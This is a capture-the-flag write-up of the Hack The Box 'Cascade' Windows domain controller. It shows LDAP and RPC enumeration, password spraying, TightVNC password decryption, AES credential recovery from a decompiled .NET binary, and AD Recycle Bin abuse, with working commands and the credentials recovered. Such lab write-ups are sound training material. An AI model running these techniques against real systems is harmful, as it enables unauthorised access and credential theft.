---
title: HTB-Cascade
draft: false
tags:
  - htb
  - windows
  - medium
  - active-directory
  - ldap
  - password-spray
  - bloodhound
  - tightvnc
  - aes
  - dnspy
  - ilspy
  - cyberchef
  - ad-recycle-bin
---
![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/cascade/Cascade.png)

## Information Gathering
### Rustscan

Rustscan finds several ports open and based on it, we can assume this is a Domain Controller machine:

`rustscan --addresses 10.10.10.182 --range 1-65535`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/cascade/image-1.png)

### Nmap

Nmap will discover which service is running on each ports:

`sudo nmap -sVC -p 53,88,135,135,445,389,636,3268,5985 10.10.10.182`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/cascade/image-2.png)

## Enumeration
### SMB - TCP 445

Let's try discovering the domain name using crackmapexec:

`crackmapexec smb 10.10.10.182`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/cascade/image.png)

Domain name cascade.local was discovered and we will add them to `/etc/hosts`.


### RPC - TCP 135

Now let's move on to enumerating RPC. 

Luckily, RPC allows null login and we can query information as such:

`rpcclient -U "" -N cascade.local`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/cascade/image-3.png)

Using the information from RPC, we will create a list of users as such:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/cascade/image-4.png)

Since we have list of valid users, we tried AS-REP Roasting, but it failed:

`GetNPUsers.py 'cascade.local/' -user users.txt -format hashcat -outputfile asrep-hash -dc-ip 10.10.10.182`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/cascade/image-5.png)

### LDAP - TCP 389

LDAP allows null bind:

`ldapsearch -H ldap://10.10.10.182 -x -b "DC=cascade,DC=local"`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/cascade/image-6.png)

Since the output is too long, we will save it into a file to sort it out later:

`ldapsearch -H ldap://10.10.10.182 -x -b "DC=cascade,DC=local" > ldap-null-bind.txt`

Now let's sort out the output using the command below:

`cat ldap-null-bind.txt | awk '{print $1}' | sort | uniq -c | sort -nr > xb-bind-sorted.txt` 

Command above sequence reads the file ldap-null-bind.txt, extracts the first word from each line, counts the occurrences of each unique word, sorts these counts in descending order, and writes the result to xb-bind-sorted.txt.

We can see that sorted output is significantlly shorter:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/cascade/image-7.png)

Exploring the sorted output, there's one interesting part: **cascadeLegacyPwd**

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/cascade/image-8.png)

Searching for the word on the ldap result, these seems to be a password leak here:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/cascade/image-9.png)


## r.thompson ownership
### Password Spraying

Let's try spraying discovered password on the list of users made from RPC:

`crackmapexec smb cascade.local -u users.txt -p 'clk0bjVldmE='`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/cascade/image-10.png)

However, none of the users have a match with the password. 

Taking a look at the discovered password again, it might be base64 encoded. Let's decode it:

`echo 'clk0bjVldmE=' | base64 -d`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/cascade/image-11.png)

Spraying the base64 decoded password (rY4n5eva) on list of users, we get a valid match for **r.thompson**:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/cascade/image-12.png)

Unfortunately, r.thompson is not in the remote management group:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/cascade/image-13.png)



## Privesc: r.thompson to s.smith
### Bloodhound

Since this machine is a domain controller, let's run Bloodhound:

`sudo bloodhound-python -u r.thompson -p rY4n5eva -c ALL -d cascade.local -ns 10.10.10.182 --dns-timeout 30`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/cascade/image-14.png)

We've spent some time trying to figure out which part to abuse to escalate our privilege into different users but it seemed impossible at the moment. 

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/cascade/image-15.png)

### SMB as r.thompson

Let's see what access r.thomspon has on SMB:

`crackmapexec smb cascade.local -u r.thompson -p 'rY4n5eva' --shares`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/cascade/image-16.png)

**Data** share is defintely something not default. Let's look into it.

Threre are serveral folders inside data share:

`sudo smbclient //10.10.10.182/Data -U r.thompson%rY4n5eva`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/cascade/image-17.png)

We will download all of thme using `mget`:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/cascade/image-18.png)

Searching for keyword `password`, we see there's something interesting in **Metting_Notes_June_2018.html**:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/cascade/image-20.png)

**Meeting_Notes_June_2018.html** is saying that they create a TempAdmin account and the password for it is the same as the normal admin account password:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/cascade/image-21.png)

Exploring around more, there's **VNC Install.reg** file inside `/Temp/s.smith` folder:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/cascade/image-22.png)

### Crack VNC password

This file is a TightVNC registry file:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/cascade/image-24.png)

Scrolling down, password hash is seen;

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/cascade/image-23.png)

From [here](https://github.com/frizb/PasswordDecrypts), we learned how to decrypt encrypted TightVNS password:

```
echo -n 6bcf2a4b6e5aca0f | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv
```

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/cascade/image-25.png)

Password is decrpyted to be **sT333ve2**. 


Spraying the cracked password on list of users, we get a match for s.smith:

`crackmapexec smb cascade.local -u users.txt -p sT333ve2`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/cascade/image-26.png)



`crackmapexec smb cascade.local -u s.smith -p sT333ve2 --shares`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/cascade/image-27.png)

s.smith is in the remote management group as well, which provides us a winrm shell:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/cascade/image-29.png)

## Privesc: s.smith to ArkSvc
### SMB as s.smith

After spending some time exploring the file system, we decided to check on SMB shares with s.smith's privilege.

s.smith has the permission to read **Audit$** share:

`crackmapexec smb cascade.local -u s.smith -p sT333ve2 --shares`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/cascade/image-30.png)

Thre are bunch of files and folders inside **Audit$** share:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/cascade/image-31.png)

Once again, we will download all of them using `mget`:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/cascade/image-32.png)

Inside `DB` folder, there is a Audit.db file:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/cascade/image-34.png)

Using **sqlite3**, we can dump the data inside and we have the password hash for user **ArkSvc**: `BQO5l5Kj9MdErXx6Q6AGOw==`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/cascade/image-33.png)

We tried decoding it with base64 but it won't return in readable format:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/cascade/image-35.png)

### AES Decrypt

**RunAudit.bat** file seems to be running **CascAudit.exe** file:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/cascade/image-36.png)

We will open **CascAudit.exe** file with **ILSpy** and take a look into it:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/cascade/image-37.png)

Inside the MainModule, some sort of key (c4scadek3y654321) is revealed:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/cascade/image-38.png)

Let's open up **CascCrypto.dll** as well.

It aes IV key is found: 1tdyjCbY1Ix49842

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/cascade/image-40.png)

So here, AES is used for the encryption method. 

Let's use Cyberchef to crack this.

We will stack From Base64 on top of AES Decrypt so that it looks like this:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/cascade/image-19.png)

Now set up the Key and IV and we will get the decrypted password: w3lc0meFr31nd

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/cascade/image-39.png)

nc.exe smbserver transfer method save it to jadu cheatsheet

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/cascade/image-28.png)

## Privesc: ArkSvc to Administrator


![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/cascade/image-41.png)

### AD Recycle Bin

`Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/cascade/image-42.png)

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/cascade/image-43.png)

YmFDVDNyMWFOMDBkbGVz
![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/cascade/a.png)


![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/cascade/a-1.png)
## References
- https://github.com/frizb/PasswordDecrypts